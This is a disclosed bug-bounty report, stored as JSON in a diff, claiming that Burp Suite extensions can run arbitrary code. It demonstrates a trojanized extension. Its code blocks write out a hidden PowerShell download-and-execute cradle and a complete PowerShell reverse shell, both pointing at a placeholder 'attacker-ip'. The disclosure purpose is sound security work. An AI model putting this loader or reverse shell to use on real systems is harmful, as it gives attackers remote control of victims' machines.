@@ -1,0 +1,151 @@
+{
+  "id": 3014158,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMDE0MTU4",
+  "url": "https://hackerone.com/reports/3014158",
+  "title": "Burp Suite extensions can execute arbitrary code",
+  "state": "Closed",
+  "substate": "informative",
+  "severity_rating": "high",
+  "readable_substate": "Informative",
+  "created_at": "2025-02-26T13:33:31.504Z",
+  "submitted_at": "2025-02-26T13:33:31.879Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "iamunixtz",
+    "url": "/iamunixtz",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/pxj6j6e3cj167uc6b7o6cjz740mz/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 15252,
+    "url": "https://hackerone.com/portswigger",
+    "handle": "portswigger",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/015/252/60e8778f4f1fee57ea2b164a7d2ec1e2d2dd7bc8_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/015/252/60e8778f4f1fee57ea2b164a7d2ec1e2d2dd7bc8_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "PortSwigger Web Security",
+      "twitter_handle": "Burp_Suite",
+      "website": "https://portswigger.net",
+      "about": "Burp Suite is the leading software for web security testing"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2025-02-26T13:52:23.646Z",
+  "bug_reporter_agreed_on_going_public_at": "2025-02-26T13:51:33.193Z",
+  "team_member_agreed_on_going_public_at": "2025-02-26T13:52:23.091Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Dear PortSwigger Security Team,**\n\nI hope you’re doing well. I’m reaching out to share a security concern regarding Burp Suite’s extension framework that could allow an attacker to compromise a machine by executing untrusted code. While Burp Suite offers powerful extensibility, this flexibility can also introduce significant security risks if an attacker crafts a malicious extension. This research highlights a attack vector that allows code execution, leading to full system compromise, including reverse shells and persistent access.\n\n## **Overview of the Issue**\nBurp Suite extensions, when installed and executed, run with the same privileges as the user. This means that an attacker can embed arbitrary system commands inside an extension that, when loaded, will execute malicious payloads. This could include actions such as:\n- Running a reverse shell to an attacker-controlled machine.\n- Downloading and executing remote payloads.\n- Capturing keystrokes, screenshots, and other sensitive data.\n- Bypassing security measures by running malicious actions in the background.\n\nFor this demonstration, I will showcase how an attacker can embed seemingly harmless functionality inside a Burp extension while covertly executing malicious actions in the background.\n\n\n## **Demonstration of the Attack**\nTo illustrate this, I created a Burp extension that appears to perform simple tasks such as opening Notepad and Calculator. However, in reality, it also performs the following malicious actions:\n1. **Creates a hidden PowerShell script** (`poc.ps1`).\n2. **Executes the PowerShell script**, which opens a reverse shell to an attacker’s machine.\n3. **Opens a backdoor using `nc` (Netcat)** to maintain persistent access.\n4. **Runs system-level commands**, such as accessing the webcam, stealing credentials, or modifying system settings.\n\n### **Code Breakdown**\nBelow is a breakdown of the extension’s malicious functionality:\n\n1. **Executing Arbitrary System Commands (e.g., Calculator, Notepad, Webcam)**\n   ```python\n   subprocess.Popen([\"calc.exe\"], shell=True)  # Opens Calculator\n   subprocess.Popen([\"notepad.exe\", \"poc.txt\"], shell=True)  # Opens Notepad with a file\n   subprocess.Popen([\"start\", \"microsoft.windows.camera:\"], shell=True)  # Opens Camera\n   ```\n   While these actions seem harmless, they demonstrate the ability to execute system commands within an extension.\n\n2. **Creating and Writing to a PowerShell Script**\n   ```python\n   file_path = os.path.join(os.getcwd(), \"burpextension\", \"poc.ps1\")\n   with open(file_path, \"w\") as file:\n       file.write(\"Start-Process powershell -ArgumentList '-NoP -NonI -W Hidden -Exec Bypass -C \\\"IEX(New-Object Net.WebClient).DownloadString(\\'http://attacker-ip:8000/rev.ps1\\')\\\"'\")\n   ```\n   This script downloads and executes a remote PowerShell payload, providing the attacker with control over the compromised system.\n\n3. **Executing the Malicious PowerShell Script**\n   ```python\n   subprocess.Popen([\"powershell.exe\", \"-ExecutionPolicy\", \"Bypass\", \"-File\", file_path], shell=True)\n   ```\n   This runs the PowerShell script, enabling remote access for the attacker.\n\n4. **Establishing a Reverse Shell with Netcat**\n   ```powershell\n   $client = New-Object System.Net.Sockets.TCPClient(\"attacker-ip\",4444);\n   $stream = $client.GetStream();\n   [byte[]]$bytes = 0..65535|%{0};\n   while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){\n       $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);\n       $sendback = (iex $data 2>&1 | Out-String );\n       $sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";\n       $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);\n       $stream.Write($sendbyte,0,$sendbyte.Length);\n       $stream.Flush()\n   }\n   ```\n   This establishes a persistent reverse shell, allowing full system access.\n\n**While Burp Suite does provide an extension signing feature, many users disable it or install extensions from unverified sources, making them vulnerable.**\n\n##Full pwn Poc\n{F4093216}\n\n## **Mitigations & Recommendations**\nTo address this issue, I propose the following mitigations:\n1. **Restrict System Commands in Extensions**\n   - Prevent direct execution of `subprocess.Popen()`, `os.system()`, or PowerShell commands inside extensions.\n   - Introduce an API restriction that blocks execution of commands unless explicitly allowed by the user.\n\n2. **Extension Code Review & Sandboxing**\n   - Implement a sandboxing mechanism that restricts what an extension can execute.\n   - Require explicit user confirmation before an extension can execute system commands.\n\n3. **Enforce Digital Signing for Extensions**\n   - Require all extensions to be signed and verified before execution.\n   - Warn users when installing unsigned extensions.\n\n4. **Monitor and Log Extension Behavior**\n   - Implement logging for all system commands executed by an extension.\n   - Alert users if an extension attempts to execute unauthorized actions.\n\n## **Conclusion**\nThis research demonstrates how a malicious Burp Suite extension can be used as a Trojan horse to execute arbitrary system commands, including launching a reverse shell. Given that Burp Suite is widely used by security professionals, pentesters, and even corporate environments, it is critical to enforce stricter controls on extension execution to prevent abuse.\n\nI appreciate your time in reviewing this report, and I hope this helps improve the security of Burp Suite. Please let me know if you need further details or if I can assist with any additional testing.\n\nLooking forward to your feedback!\n\n## Impact\n\nThe primary issue is that Burp Suite extensions execute code with the same privileges as the user. If an attacker manages to convince a target to install a malicious extension, they can:\n- Gain **persistent access** to the system.\n- Execute **arbitrary system commands** in the background.\n- Steal **sensitive data** without detection.\n- **Bypass security measures** by executing trusted processes (e.g., PowerShell, cmd.exe, or Windows utilities).",
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 4093177,
+      "file_name": "pocextension.py",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/7over0tn6vdu58x3horegsigv4c1?response-content-disposition=attachment%3B%20filename%3D%22pocextension.py%22%3B%20filename%2A%3DUTF-8%27%27pocextension.py&response-content-type=text%2Fx-python&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSEUMKURF%2F20260220%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260220T201152Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICB2WXmKypzIHmfev3egMHmbLygZF9HeqG55FwG46TbCAiEAqcfq57bVj0QW8vWVz%2BQW2ndztoQ5GkgrpKycL931HjkquwUIm%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDAw4u7WQcJCSzad1SyqPBVd053uq3giFwswNv%2F02st3Qj5togMB8zF0HmzANpFMDKn3JM3a99wooZF%2B2N97EHT37A1pQ4luByNXLj1vUKYHwJlHjh3gk1t2%2FozLCvjeptMpQtlh4Gv%2BBogmNfAalO1LyXpaFSC59EOGeJ83azztlopLxdX3x0vruubn%2BKvIL6k6mplpzVUbVRGWagp%2BeyNtKq7XZBgQ1HDZIF5Wu0ZQTiX2hPLEOuxtAnR4qrL1BbF2FfChqGtGRul8N240wFrIrRPrkuKAVCv3vPLVCgWRzG2dB4cpyppe57KJf6RazXFiBx7K0CupkoN7fyfzBs05PyoxXtSq%2BomDINcq%2FhCI4ZPieP%2Be7%2F8yhc%2B295hGd5LuZCGGJDyIMaMgS6M0%2BKb02%2BU6Kf807fEC83%2BKnQ5wQSd2RAZFxPy6u6tjCkhmtP8fxMKWa%2BUcWZwycajZLzpZVzWGhlZNRpfdvA9x5%2F6FpD94u0pYEPAMZLJSlB%2F9GeOen%2Fxh1FRT7WVH8AkHvnRdakjm%2BDf3X9f6KmJYgcbAlxb%2BzNChKJJYHS6ITZgZSasWd4XyUriKeDURIt5Lom2k4umyLUaBk3e0nE61KmWoEznxRf%2FMPnn38DB8yjlvsHz%2F9UcDXdeyLDYasMNsAPbfo5o3P8vOKB232PawnyIV8kZyPePf43h8iVhadmQodva41KHiouMTigIhmVFi0VPKLd6h42gZ5a3iFJZKjgCsmlTN8lalV6PV1qODKKMkHPSg%2FmqYCBLmZzILoKCfrLXaUWB4bzSjmewZy7O6CoAgQVnLOyCW3OSUEm6SSHtLZwpLMTePlbkmI30Jxb5eXk24JSi8XYfPhWu3XIdzQRJwqfOYqlWR7XnFYFBPdVh0w0sXizAY6sQEqwaRbDLKm%2Bx%2FR9A6PpC1v51R438xpXvVxShiWvFqPSZKDWpUmQ5rBr6OxoKBG%2B%2FX66ZaIVdupobKsER7fi%2BTF6t97VuQUo4NqpWIIbyCZLa1k1d9IcVXES0vFlBz%2FeVphzbgOqntnjY1d82p4YcvnI8Xn96ziUP%2By0kzr9T8Txu5RUDc4d2kqXN3swHpmAJq8t2%2FGzngST1BGbmcUbEsORAK4A4LDu4sq6EF4Jlv9YtE%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5af0ed0791f6bb8eb756b13f66b92c75e24e777ea5e18f39bea2e02ad3a64006",
+      "file_size": 2111,
+      "type": "text/x-python",
+      "moderated": null
+    },
+    {
+      "id": 4093216,
+      "file_name": "pwn_by_burp.mp4",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/radhoin1m7jitw5q1qebq110fn2g?response-content-disposition=attachment%3B%20filename%3D%22pwn_by_burp.mp4%22%3B%20filename%2A%3DUTF-8%27%27pwn_by_burp.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSEUMKURF%2F20260220%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260220T201152Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICB2WXmKypzIHmfev3egMHmbLygZF9HeqG55FwG46TbCAiEAqcfq57bVj0QW8vWVz%2BQW2ndztoQ5GkgrpKycL931HjkquwUIm%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDAw4u7WQcJCSzad1SyqPBVd053uq3giFwswNv%2F02st3Qj5togMB8zF0HmzANpFMDKn3JM3a99wooZF%2B2N97EHT37A1pQ4luByNXLj1vUKYHwJlHjh3gk1t2%2FozLCvjeptMpQtlh4Gv%2BBogmNfAalO1LyXpaFSC59EOGeJ83azztlopLxdX3x0vruubn%2BKvIL6k6mplpzVUbVRGWagp%2BeyNtKq7XZBgQ1HDZIF5Wu0ZQTiX2hPLEOuxtAnR4qrL1BbF2FfChqGtGRul8N240wFrIrRPrkuKAVCv3vPLVCgWRzG2dB4cpyppe57KJf6RazXFiBx7K0CupkoN7fyfzBs05PyoxXtSq%2BomDINcq%2FhCI4ZPieP%2Be7%2F8yhc%2B295hGd5LuZCGGJDyIMaMgS6M0%2BKb02%2BU6Kf807fEC83%2BKnQ5wQSd2RAZFxPy6u6tjCkhmtP8fxMKWa%2BUcWZwycajZLzpZVzWGhlZNRpfdvA9x5%2F6FpD94u0pYEPAMZLJSlB%2F9GeOen%2Fxh1FRT7WVH8AkHvnRdakjm%2BDf3X9f6KmJYgcbAlxb%2BzNChKJJYHS6ITZgZSasWd4XyUriKeDURIt5Lom2k4umyLUaBk3e0nE61KmWoEznxRf%2FMPnn38DB8yjlvsHz%2F9UcDXdeyLDYasMNsAPbfo5o3P8vOKB232PawnyIV8kZyPePf43h8iVhadmQodva41KHiouMTigIhmVFi0VPKLd6h42gZ5a3iFJZKjgCsmlTN8lalV6PV1qODKKMkHPSg%2FmqYCBLmZzILoKCfrLXaUWB4bzSjmewZy7O6CoAgQVnLOyCW3OSUEm6SSHtLZwpLMTePlbkmI30Jxb5eXk24JSi8XYfPhWu3XIdzQRJwqfOYqlWR7XnFYFBPdVh0w0sXizAY6sQEqwaRbDLKm%2Bx%2FR9A6PpC1v51R438xpXvVxShiWvFqPSZKDWpUmQ5rBr6OxoKBG%2B%2FX66ZaIVdupobKsER7fi%2BTF6t97VuQUo4NqpWIIbyCZLa1k1d9IcVXES0vFlBz%2FeVphzbgOqntnjY1d82p4YcvnI8Xn96ziUP%2By0kzr9T8Txu5RUDc4d2kqXN3swHpmAJq8t2%2FGzngST1BGbmcUbEsORAK4A4LDu4sq6EF4Jlv9YtE%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=0071b517c15be7f93f39b076e0711b5244f577e016af3cd78bdb5c537365e3fa",
+      "file_size": 138584335,
+      "type": "video/mp4",
+      "moderated": null
+    },
+    {
+      "id": 4093225,
+      "file_name": "pwn_by_burp.mp4",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/w76agxagdyp44d1zl9a3x8m7p6pj?response-content-disposition=attachment%3B%20filename%3D%22pwn_by_burp.mp4%22%3B%20filename%2A%3DUTF-8%27%27pwn_by_burp.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSEUMKURF%2F20260220%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260220T201152Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICB2WXmKypzIHmfev3egMHmbLygZF9HeqG55FwG46TbCAiEAqcfq57bVj0QW8vWVz%2BQW2ndztoQ5GkgrpKycL931HjkquwUIm%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDAw4u7WQcJCSzad1SyqPBVd053uq3giFwswNv%2F02st3Qj5togMB8zF0HmzANpFMDKn3JM3a99wooZF%2B2N97EHT37A1pQ4luByNXLj1vUKYHwJlHjh3gk1t2%2FozLCvjeptMpQtlh4Gv%2BBogmNfAalO1LyXpaFSC59EOGeJ83azztlopLxdX3x0vruubn%2BKvIL6k6mplpzVUbVRGWagp%2BeyNtKq7XZBgQ1HDZIF5Wu0ZQTiX2hPLEOuxtAnR4qrL1BbF2FfChqGtGRul8N240wFrIrRPrkuKAVCv3vPLVCgWRzG2dB4cpyppe57KJf6RazXFiBx7K0CupkoN7fyfzBs05PyoxXtSq%2BomDINcq%2FhCI4ZPieP%2Be7%2F8yhc%2B295hGd5LuZCGGJDyIMaMgS6M0%2BKb02%2BU6Kf807fEC83%2BKnQ5wQSd2RAZFxPy6u6tjCkhmtP8fxMKWa%2BUcWZwycajZLzpZVzWGhlZNRpfdvA9x5%2F6FpD94u0pYEPAMZLJSlB%2F9GeOen%2Fxh1FRT7WVH8AkHvnRdakjm%2BDf3X9f6KmJYgcbAlxb%2BzNChKJJYHS6ITZgZSasWd4XyUriKeDURIt5Lom2k4umyLUaBk3e0nE61KmWoEznxRf%2FMPnn38DB8yjlvsHz%2F9UcDXdeyLDYasMNsAPbfo5o3P8vOKB232PawnyIV8kZyPePf43h8iVhadmQodva41KHiouMTigIhmVFi0VPKLd6h42gZ5a3iFJZKjgCsmlTN8lalV6PV1qODKKMkHPSg%2FmqYCBLmZzILoKCfrLXaUWB4bzSjmewZy7O6CoAgQVnLOyCW3OSUEm6SSHtLZwpLMTePlbkmI30Jxb5eXk24JSi8XYfPhWu3XIdzQRJwqfOYqlWR7XnFYFBPdVh0w0sXizAY6sQEqwaRbDLKm%2Bx%2FR9A6PpC1v51R438xpXvVxShiWvFqPSZKDWpUmQ5rBr6OxoKBG%2B%2FX66ZaIVdupobKsER7fi%2BTF6t97VuQUo4NqpWIIbyCZLa1k1d9IcVXES0vFlBz%2FeVphzbgOqntnjY1d82p4YcvnI8Xn96ziUP%2By0kzr9T8Txu5RUDc4d2kqXN3swHpmAJq8t2%2FGzngST1BGbmcUbEsORAK4A4LDu4sq6EF4Jlv9YtE%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1bbd5405b52178c4206f053f555f142fcd1e51eba21c83fa4fe01b32d64595b7",
+      "file_size": 138584335,
+      "type": "video/mp4",
+      "moderated": null
+    },
+    {
+      "id": 4093226,
+      "file_name": "pwn_by_burp.mp4",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/gb504dzqaf7gczfvz0gva1icylj5?response-content-disposition=attachment%3B%20filename%3D%22pwn_by_burp.mp4%22%3B%20filename%2A%3DUTF-8%27%27pwn_by_burp.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSEUMKURF%2F20260220%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260220T201152Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICB2WXmKypzIHmfev3egMHmbLygZF9HeqG55FwG46TbCAiEAqcfq57bVj0QW8vWVz%2BQW2ndztoQ5GkgrpKycL931HjkquwUIm%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDAw4u7WQcJCSzad1SyqPBVd053uq3giFwswNv%2F02st3Qj5togMB8zF0HmzANpFMDKn3JM3a99wooZF%2B2N97EHT37A1pQ4luByNXLj1vUKYHwJlHjh3gk1t2%2FozLCvjeptMpQtlh4Gv%2BBogmNfAalO1LyXpaFSC59EOGeJ83azztlopLxdX3x0vruubn%2BKvIL6k6mplpzVUbVRGWagp%2BeyNtKq7XZBgQ1HDZIF5Wu0ZQTiX2hPLEOuxtAnR4qrL1BbF2FfChqGtGRul8N240wFrIrRPrkuKAVCv3vPLVCgWRzG2dB4cpyppe57KJf6RazXFiBx7K0CupkoN7fyfzBs05PyoxXtSq%2BomDINcq%2FhCI4ZPieP%2Be7%2F8yhc%2B295hGd5LuZCGGJDyIMaMgS6M0%2BKb02%2BU6Kf807fEC83%2BKnQ5wQSd2RAZFxPy6u6tjCkhmtP8fxMKWa%2BUcWZwycajZLzpZVzWGhlZNRpfdvA9x5%2F6FpD94u0pYEPAMZLJSlB%2F9GeOen%2Fxh1FRT7WVH8AkHvnRdakjm%2BDf3X9f6KmJYgcbAlxb%2BzNChKJJYHS6ITZgZSasWd4XyUriKeDURIt5Lom2k4umyLUaBk3e0nE61KmWoEznxRf%2FMPnn38DB8yjlvsHz%2F9UcDXdeyLDYasMNsAPbfo5o3P8vOKB232PawnyIV8kZyPePf43h8iVhadmQodva41KHiouMTigIhmVFi0VPKLd6h42gZ5a3iFJZKjgCsmlTN8lalV6PV1qODKKMkHPSg%2FmqYCBLmZzILoKCfrLXaUWB4bzSjmewZy7O6CoAgQVnLOyCW3OSUEm6SSHtLZwpLMTePlbkmI30Jxb5eXk24JSi8XYfPhWu3XIdzQRJwqfOYqlWR7XnFYFBPdVh0w0sXizAY6sQEqwaRbDLKm%2Bx%2FR9A6PpC1v51R438xpXvVxShiWvFqPSZKDWpUmQ5rBr6OxoKBG%2B%2FX66ZaIVdupobKsER7fi%2BTF6t97VuQUo4NqpWIIbyCZLa1k1d9IcVXES0vFlBz%2FeVphzbgOqntnjY1d82p4YcvnI8Xn96ziUP%2By0kzr9T8Txu5RUDc4d2kqXN3swHpmAJq8t2%2FGzngST1BGbmcUbEsORAK4A4LDu4sq6EF4Jlv9YtE%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a4c4edd1ca5f0c16cf753e1a8c52e2aaa9291df331592fc648e313a13390fb0c",
+      "file_size": 138584335,
+      "type": "video/mp4",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 83,
+  "voters": [
+    "aboalezz",
+    "k0ns0l",
+    "g3ksec",
+    "daisy0512",
+    "dukrov",
+    "odaysec",
+    "thalaivar304",
+    "jmo740",
+    "2026",
+    "pin0ccs",
+    "and 73 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 169,
+    "asset_type": "DOWNLOADABLE_EXECUTABLES",
+    "asset_identifier": "Burp Suite Pro/Community",
+    "max_severity": "high"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
